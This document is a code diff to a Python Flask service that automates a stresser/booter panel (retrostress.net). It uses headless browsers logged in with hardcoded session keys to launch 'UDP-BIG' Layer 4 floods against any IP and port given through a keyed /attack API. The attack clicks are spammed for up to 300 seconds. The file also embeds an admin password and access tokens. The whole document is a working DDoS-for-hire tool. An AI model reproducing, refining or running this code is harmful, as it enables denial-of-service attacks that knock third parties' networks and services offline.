@@ -14,19 +14,17 @@ import queue
 app = Flask(__name__)
 CORS(app)
 
-# ========== CONFIG (LOW RAM) ==========
+# ========== CONFIG ==========
 METHOD         = "UDP-BIG"
 ADMIN_PASSWORD = "krishna"
 PORT           = 3938
-MAX_PRELOADED  = 1                     # ⚡ SIRF 1 WORKER (908 MB VPS)
+MAX_PRELOADED  = 1
 API_NAME       = "krishna father of STTRSERRR"
 
-# ⚡ SPEED SETTINGS
 CLICK_DELAY    = 0.008
 SCREENSHOT_AT  = 1
 CLICK_REPORT   = 500
 
-# ⚡ RAM OPTIMIZATION FLAGS
 BROWSER_ARGS = [
     "--no-sandbox",
     "--disable-dev-shm-usage",
@@ -43,19 +41,18 @@ BROWSER_ARGS = [
     "--disable-sync",
     "--no-first-run",
     "--no-default-browser-check",
-    "--single-process",                 # ⚡ 1 PROCESS = kam RAM
+    "--single-process",
     "--memory-pressure-off",
-    "--js-flags=--max-old-space-size=128",   # ⚡ JS memory limit
+    "--js-flags=--max-old-space-size=128",
     "--aggressive-cache-discard",
     "--disable-application-cache",
     "--disable-offline-load-stale-cache",
     "--disk-cache-size=0",
     "--media-cache-size=0",
     "--disable-cache",
-    "--disable-http2",                  # ⚡ faster
+    "--disable-http2",
 ]
 
-# ========== SESSIONS (6 TOKENS) ==========
 SESSIONS_DATA = [
     {"session_number": 1, "access_key": "32de18ee49ba49ada55f3ca2e1fe8d1fd5601d5d1c8b48f2be24395e61c56482"},
     {"session_number": 2, "access_key": "0021c1d3e3b0434e97cf81017dd2729b6a02ab98e8b1471f9a704c2b866b5148"},
@@ -65,7 +62,6 @@ SESSIONS_DATA = [
     {"session_number": 6, "access_key": "cb8e5fc461194fc783ea7dd579bab6a3ef58f09a1c9c475d96759687e92af403"}
 ]
 
-# ========== GLOBALS ==========
 sessions             = []
 sessions_lock        = threading.Lock()
 active_attacks       = 0
@@ -83,7 +79,7 @@ session_index_lock   = threading.Lock()
 SS_FOLDER = "screenshots"
 os.makedirs(SS_FOLDER, exist_ok=True)
 
-# ========== STORAGE ==========
+
 def load_api_keys():
     global api_keys
     try:
@@ -156,7 +152,6 @@ def check_password(req):
     return (req.args.get("password") or req.headers.get("X-Password")) == ADMIN_PASSWORD
 
 
-# ========== SCREENSHOT ==========
 def take_screenshot(page, name):
     try:
         path = os.path.join(SS_FOLDER, name)
@@ -172,19 +167,15 @@ def get_attack_ss_name(n):
     return f"atk{str(n).zfill(4)}.png"
 
 
-# ========== RAM CLEANUP ==========
 def cleanup_ram():
-    """Force garbage collection"""
     gc.collect()
     try:
-        # Linux: drop caches (agar permission hai)
         with open('/proc/sys/vm/drop_caches', 'w') as f:
             f.write('1')
     except:
         pass
 
 
-# ========== WORKER (LOW RAM) ==========
 def worker_thread(worker_number):
     global active_attacks, workers_loading, attack_counter
 
@@ -196,28 +187,21 @@ def worker_thread(worker_number):
 
     try:
         print(f"[W-{worker_number}] Session {session_id} | Launching browser...")
-        
-        # ⚡ Launch with low-RAM args
         try:
             browser = launch(headless=True, args=BROWSER_ARGS)
         except TypeError:
-            # Fallback agar args support nahi karta
             browser = launch(headless=True)
-        
+
         page = browser.new_page()
-        
-        # ⚡ Smaller viewport = kam RAM
         page.set_viewport_size({"width": 800, "height": 600})
-        
-        # ⚡ Block images, fonts, CSS = kam RAM + fast
+
         page.route("**/*", lambda route: (
-            route.abort() if route.request.resource_type in ["image", "font", "media", "stylesheet"]
+            route.abort() if route.request.resource_type in ["image", "font", "media"]
             else route.continue_()
         ))
-        
+
         page.context.add_cookies(session["cookies"])
 
-        # ⚡ Fast page load
         try:
             page.goto("https://retrostress.net/panel",
                       wait_until="domcontentloaded",
@@ -226,7 +210,7 @@ def worker_thread(worker_number):
             print(f"[W-{worker_number}] Goto error: {e}")
             return
 
-        time.sleep(2.5)
+        time.sleep(3)
 
         if "auth" in page.url or "login" in page.url:
             print(f"[W-{worker_number}] Session expired!")
@@ -234,100 +218,172 @@ def worker_thread(worker_number):
 
         print(f"[W-{worker_number}] Panel: {page.url}")
 
-        # ⚡ METHOD SELECT (Light)
+        # ═══════════════════════════════════════
+        # METHOD SELECTION - FIXED
+        # ═══════════════════════════════════════
         method_selected = False
         for retry in range(3):
             try:
-                # Layer 4
-                clicked = page.evaluate("""
-                    () => {
-                        const btns = document.querySelectorAll('button');
-                        for (const b of btns) {
-                            const t = b.innerText || b.textContent || '';
-                            if (t.includes('Network endpoint') || t.includes('Layer 4')) {
-                                b.click(); return true;
-                            }
-                        }
-                        return false;
-                    }
-                """)
-                if not clicked:
-                    raise Exception("Layer 4 not found")
-                time.sleep(0.4)
+                print(f"[W-{worker_number}] Method select try {retry+1}")
 
-                # Browse
-                clicked = page.evaluate("""
+                # STEP 1: Network endpoint
+                step1 = page.evaluate("""
                     () => {
-                        const span = document.querySelector('span.app-method-trigger-action');
-                        if (span) { span.click(); return true; }
-                        const sp = document.querySelectorAll('span');
-                        for (const s of sp) {
-                            if (s.innerText && s.innerText.includes('Browse methods')) {
-                                s.click(); return true;
+                        const labels = document.querySelectorAll('label');
+                        for (const lbl of labels) {
+                            const txt = (lbl.innerText || lbl.textContent || '').toLowerCase();
+                            if (txt.includes('network endpoint') || txt.includes('layer 4')) {
+                                lbl.click(); return 'label';
+                            }
+                        }
+                        const all = document.querySelectorAll('div, span, button');
+                        for (const el of all) {
+                            const txt = (el.innerText || el.textContent || '').trim();
+                            if (txt === 'Network endpoint' || (txt.includes('Network endpoint') && txt.includes('Layer 4'))) {
+                                el.click();
+                                if (el.closest('label')) el.closest('label').click();
+                                return 'element';
+                            }
+                        }
+                        const radios = document.querySelectorAll('input[type="radio"]');
+                        for (const r of radios) {
+                            const parent = r.closest('div, label');
+                            if (parent) {
+                                const txt = (parent.innerText || parent.textContent || '').toLowerCase();
+                                if (txt.includes('network endpoint') || txt.includes('layer 4')) {
+                                    r.click(); parent.click(); return 'radio';
+                                }
                             }
                         }
                         return false;
                     }
                 """)
-                if not clicked:
-                    raise Exception("Browse not found")
-                time.sleep(0.8)
+                print(f"[W-{worker_number}] Step1: {step1}")
+                if not step1:
+                    take_screenshot(page, f"debug_s1_w{worker_number}_r{retry+1}.png")
+                    raise Exception("Network endpoint failed")
+                time.sleep(1.5)
 
-                # UDP
-                clicked = page.evaluate("""
-                    () => {
-                        const btns = document.querySelectorAll('button');
-                        for (const b of btns) {
-                            const t = (b.innerText || b.textContent || '').trim();
-                            if (t === 'UDP') { b.click(); return true; }
-                        }
+                # STEP 2: Target URL
+                step2 = page.evaluate(f"""
+                    () => {{
+                        const inputs = document.querySelectorAll('input, textarea');
+                        for (const inp of inputs) {{
+                            const ph = (inp.placeholder || '').toLowerCase();
+                            const al = (inp.getAttribute('aria-label') || '').toLowerCase();
+                            const nm = (inp.name || '').toLowerCase();
+                            const id = (inp.id || '').toLowerCase();
+                            if (ph.includes('url') || ph.includes('target') || ph.includes('host') || 
+                                ph.includes('ip') || al.includes('url') || al.includes('target') ||
+                                nm.includes('url') || nm.includes('target') || id.includes('url') || id === 'test-url') {{
+                                inp.focus();
+                                inp.value = '{target_ip}';
+                                inp.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                inp.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                return 'filled ' + (ph || id || 'input');
+                            }}
+                        }}
+                        for (const inp of inputs) {{
+                            if (!inp.value && inp.offsetParent !== null && inp.type !== 'radio' && inp.type !== 'checkbox') {{
+                                inp.focus();
+                                inp.value = '{target_ip}';
+                                inp.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                inp.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                return 'fallback';
+                            }}
+                        }}
                         return false;
-                    }
+                    }}
                 """)
-                if not clicked:
-                    raise Exception("UDP not found")
-                time.sleep(0.4)
+                print(f"[W-{worker_number}] Step2: {step2}")
 
-                # UDP-BIG
-                clicked = page.evaluate("""
+                # Port
+                page.evaluate(f"""
+                    () => {{
+                        const inputs = document.querySelectorAll('input');
+                        for (const inp of inputs) {{
+                            const ph = (inp.placeholder || '').toLowerCase();
+                            const al = (inp.getAttribute('aria-label') || '').toLowerCase();
+                            if (ph.includes('port') || al.includes('port') || inp.id.includes('port')) {{
+                                inp.focus();
+                                inp.value = '{port}';
+                                inp.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                inp.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                return;
+                            }}
+                        }}
+                    }}
+                """)
+                time.sleep(0.5)
+
+                # STEP 3: Browse methods
+                step3 = page.evaluate("""
                     () => {
-                        const opts = document.querySelectorAll('button[role="option"]');
-                        for (const o of opts) {
-                            const s = o.querySelector('strong');
-                            if (s && s.textContent.trim() === 'UDP-BIG') {
-                                o.click(); return true;
-                            }
-                        }
-                        const btns = document.querySelectorAll('button');
-                        for (const b of btns) {
-                            const s = b.querySelector('strong');
-                            if (s && s.textContent.trim() === 'UDP-BIG') {
-                                b.click(); return true;
+                        const all = document.querySelectorAll('button, span, div, a');
+                        for (const el of all) {
+                            const txt = (el.innerText || el.textContent || '').trim();
+                            if (txt.includes('Browse methods')) {
+                                el.click(); return 'clicked';
                             }
                         }
                         return false;
                     }
                 """)
-                if not clicked:
-                    raise Exception("UDP-BIG not found")
-                time.sleep(0.3)
+                print(f"[W-{worker_number}] Step3: {step3}")
+                if not step3:
+                    take_screenshot(page, f"debug_s3_w{worker_number}_r{retry+1}.png")
+                    raise Exception("Browse methods failed")
+                time.sleep(2)
+
+                # STEP 4: UDP tab
+                step4 = page.evaluate("""
+                    () => {
+                        const all = document.querySelectorAll('button, div[role="tab"], li, span');
+                        for (const el of all) {
+                            const txt = (el.innerText || el.textContent || '').trim();
+                            if (txt === 'UDP') {
+                                el.click(); return 'clicked UDP';
+                            }
+                        }
+                        return false;
+                    }
+                """)
+                print(f"[W-{worker_number}] Step4: {step4}")
+                time.sleep(1)
+
+                # STEP 5: UDP-BIG
+                step5 = page.evaluate("""
+                    () => {
+                        const all = document.querySelectorAll('button, div, span, strong, li');
+                        for (const el of all) {
+                            const txt = (el.innerText || el.textContent || '').trim();
+                            if (txt === 'UDP-BIG' || txt.startsWith('UDP-BIG ')) {
+                                el.click(); return 'clicked UDP-BIG';
+                            }
+                        }
+                        return false;
+                    }
+                """)
+                print(f"[W-{worker_number}] Step5: {step5}")
+                if not step5:
+                    take_screenshot(page, f"debug_s5_w{worker_number}_r{retry+1}.png")
+                    raise Exception("UDP-BIG failed")
+                time.sleep(1)
 
                 method_selected = True
+                print(f"[W-{worker_number}] ✅ Method selected!")
                 break
+
             except Exception as e:
                 print(f"[W-{worker_number}] Retry {retry+1}: {e}")
-                try:
-                    page.keyboard.press('Escape')
-                except:
-                    pass
-                time.sleep(1)
+                try: page.keyboard.press('Escape')
+                except: pass
+                time.sleep(2)
                 if retry == 2:
                     return
 
         if not method_selected:
             return
-
-        print(f"[W-{worker_number}] ✅ Ready!")
 
         with workers_loading_lock:
             if workers_loading > 0:
@@ -338,17 +394,14 @@ def worker_thread(worker_number):
             if len(worker_pool) >= MAX_PRELOADED:
                 return
             worker_pool.append(worker_number)
-            pool_size = len(worker_pool)
 
-        print(f"[W-{worker_number}] Pool: {pool_size}/{MAX_PRELOADED}")
+        print(f"[W-{worker_number}] ✅ Ready!")
 
-        # ⚡ WAIT FOR JOB
         while True:
             try:
-                job = attack_queue.get(timeout=60)  # 60s timeout
+                job = attack_queue.get(timeout=60)
                 break
             except queue.Empty:
-                print(f"[W-{worker_number}] No job, waiting...")
                 continue
 
         with worker_pool_lock:
@@ -367,41 +420,15 @@ def worker_thread(worker_number):
         ss_name = get_attack_ss_name(atk_num)
         print(f"[W-{worker_number}] 🎯 ATK-{atk_num} | {target_ip}:{port} | {duration}s")
 
-        # Fill IP
-        page.evaluate(f"""
-            () => {{
-                const el = document.querySelector('input#test-url');
-                if (el) {{
-                    el.value = '{target_ip}';
-                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                }}
-            }}
-        """)
-
-        # Fill Port
-        page.evaluate(f"""
-            () => {{
-                const el = document.querySelector('input[aria-label="port"]');
-                if (el) {{
-                    el.value = '{port}';
-                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                }}
-            }}
-        """)
-
-        attack_button = page.locator('button.button.primary:has-text("Start test")')
+        attack_button = page.locator('button:has-text("Start test"), button:has-text("Start Test")')
         spam_duration = max(duration - 1, 1)
         start_time = time.time()
         click_count = 0
         ss_taken = False
 
-        print(f"[W-{worker_number}] 🚀 SPAM START")
-
         while time.time() - start_time < spam_duration:
             try:
-                attack_button.click(force=True, no_wait_after=True)
+                attack_button.first.click(force=True, no_wait_after=True)
                 click_count += 1
 
                 if not ss_taken and time.time() - start_time >= SCREENSHOT_AT:
@@ -412,53 +439,39 @@ def worker_thread(worker_number):
                     elapsed = int(time.time() - start_time)
                     remaining = int(spam_duration - elapsed)
                     cps = int(click_count / max(elapsed, 1))
-                    print(f"[W-{worker_number}] ⚡ {click_count} clicks | {cps}/s | {remaining}s left")
+                    print(f"[W-{worker_number}] ⚡ {click_count} | {cps}/s | {remaining}s left")
 
                 time.sleep(CLICK_DELAY)
-            except Exception:
+            except:
                 time.sleep(CLICK_DELAY)
-                continue
 
         total_time = time.time() - start_time
         cps = int(click_count / max(total_time, 1))
         print(f"[W-{worker_number}] ✅ DONE! {click_count} clicks | {cps}/s")
-
-        # ⚡ RAM cleanup after attack
         cleanup_ram()
 
     except Exception as e:
         print(f"[W-{worker_number}] Error: {e}")
     finally:
         if page:
-            try:
-                page.close()
-            except:
-                pass
+            try: page.close()
+            except: pass
         if browser:
-            try:
-                browser.close()
-            except:
-                pass
-
-        # ⚡ Force cleanup
+            try: browser.close()
+            except: pass
         cleanup_ram()
-
         with worker_pool_lock:
             if worker_number in worker_pool:
                 worker_pool.remove(worker_number)
-
         if not loading_decreased:
             with workers_loading_lock:
                 if workers_loading > 0:
                     workers_loading -= 1
-
         with sessions_lock:
             active_attacks -= 1
-
         print(f"[W-{worker_number}] Released!")
 
 
-# ========== POOL MANAGER ==========
 worker_counter = 0
 worker_counter_lock = threading.Lock()
 
@@ -472,7 +485,6 @@ def pool_manager():
             with workers_loading_lock:
                 loading = workers_loading
             needed = MAX_PRELOADED - (pool_size + loading)
-
             if needed > 0:
                 print(f"[Pool] Ready: {pool_size} | Loading: {loading} | Need: {needed}")
                 for i in range(needed):
@@ -488,7 +500,6 @@ def pool_manager():
         time.sleep(5)
 
 
-# ========== ROUTES ==========
 @app.route("/admin/generate_key", methods=["GET"])
 def generate_key():
     if not check_password(request):
@@ -502,29 +513,16 @@ def generate_key():
     if slots > get_available_slots():
         return jsonify({"status": "error", "available": get_available_slots()}), 400
     k = generate_api_key()
-    api_keys[k] = {
-        "slots": slots,
-        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "active": True
-    }
+    api_keys[k] = {"slots": slots, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "active": True}
     save_api_keys()
-    return jsonify({
-        "status": "success",
-        "api_key": k,
-        "slots": slots,
-        "api_name": API_NAME
-    })
+    return jsonify({"status": "success", "api_key": k, "slots": slots, "api_name": API_NAME})
 
 
 @app.route("/admin/list_keys", methods=["GET"])
 def list_keys():
     if not check_password(request):
         return jsonify({"status": "error"}), 403
-    return jsonify({
-        "status": "success",
-        "keys": list(api_keys.keys()),
-        "api_name": API_NAME
-    })
+    return jsonify({"status": "success", "keys": list(api_keys.keys()), "api_name": API_NAME})
 
 
 @app.route("/attack/<ip>/<int:port>/<int:time_sec>", methods=["GET"])
@@ -535,34 +533,15 @@ def attack_url(ip, port, time_sec):
         return jsonify({"status": "error", "message": "Invalid Key"}), 403
     if time_sec > 300 or time_sec < 1:
         return jsonify({"status": "error", "message": "Duration 1-300s"}), 400
-
     with worker_pool_lock:
         pool_size = len(worker_pool)
-
     if pool_size == 0:
         return jsonify({"status": "error", "message": "No workers ready"}), 429
-
     with sessions_lock:
         active_attacks += 1
         aid = active_attacks
-
-    attack_queue.put({
-        "ip": ip,
-        "port": port,
-        "duration": time_sec,
-        "attack_id": aid
-    })
-
-    return jsonify({
-        "status": "success",
-        "message": "Launched!",
-        "api_name": API_NAME,
-        "attack_id": aid,
-        "target": f"{ip}:{port}",
-        "duration": f"{time_sec}s",
-        "pool_ready": pool_size,
-        "active_attacks": active_attacks
-    })
+    attack_queue.put({"ip": ip, "port": port, "duration": time_sec, "attack_id": aid})
+    return jsonify({"status": "success", "message": "Launched!", "api_name": API_NAME, "attack_id": aid, "target": f"{ip}:{port}", "duration": f"{time_sec}s", "pool_ready": pool_size})
 
 
 @app.route("/attack", methods=["GET"])
@@ -581,61 +560,26 @@ def status():
         pool_size = len(worker_pool)
     with workers_loading_lock:
         loading = workers_loading
-    try:
-        ss_count = len(os.listdir(SS_FOLDER))
-    except:
-        ss_count = 0
-    return jsonify({
-        "status": "Online",
-        "api_name": API_NAME,
-        "pool_ready": pool_size,
-        "pool_loading": loading,
-        "max_pool": MAX_PRELOADED,
-        "active_attacks": active_attacks,
-        "screenshots": ss_count,
-        "sessions": len(sessions),
-        "speed": "FAST (LOW-RAM)",
-        "click_delay": CLICK_DELAY
-    })
-
-
-@app.route("/screenshots", methods=["GET"])
-def list_screenshots():
-    try:
-        files = sorted(os.listdir(SS_FOLDER))
-        return jsonify({"total": len(files), "files": files})
-    except:
-        return jsonify({"error": "Failed"}), 500
+    return jsonify({"status": "Online", "api_name": API_NAME, "pool_ready": pool_size, "pool_loading": loading, "max_pool": MAX_PRELOADED, "active_attacks": active_attacks, "sessions": len(sessions)})
 
 
 @app.route("/", methods=["GET"])
 def home():
-    return jsonify({
-        "status": "Online",
-        "api_name": API_NAME,
-        "port": PORT,
-        "sessions": len(sessions),
-        "mode": "LOW-RAM OPTIMIZED"
-    })
+    return jsonify({"status": "Online", "api_name": API_NAME, "port": PORT, "sessions": len(sessions)})
 
 
-# ========== MAIN ==========
 if __name__ == "__main__":
     print("=" * 60)
     print(API_NAME)
-    print("LOW-RAM OPTIMIZED VERSION")
     print("=" * 60)
     load_api_keys()
     if not load_sessions():
         print("No sessions!")
         exit(1)
-    print(f"Sessions:     {len(sessions)}")
-    print(f"Workers:      {MAX_PRELOADED}")
-    print(f"Method:       {METHOD}")
-    print(f"Speed:        FAST")
-    print(f"Pwd:          {ADMIN_PASSWORD}")
-    print(f"Port:         {PORT}")
-    print("=" * 60)
+    print(f"Sessions: {len(sessions)}")
+    print(f"Workers:  {MAX_PRELOADED}")
+    print(f"Pwd:      {ADMIN_PASSWORD}")
+    print(f"Port:     {PORT}")
     threading.Thread(target=pool_manager, daemon=True).start()
     print(f"Loading {MAX_PRELOADED} workers...")
     timeout = 180
@@ -651,6 +595,5 @@ if __name__ == "__main__":
         time.sleep(3)
     print(f"\nReady: {len(worker_pool)}/{MAX_PRELOADED}")
     print(f"Port:  {PORT}")
-    print(f"Pwd:   {ADMIN_PASSWORD}")
     print("=" * 60)
     app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
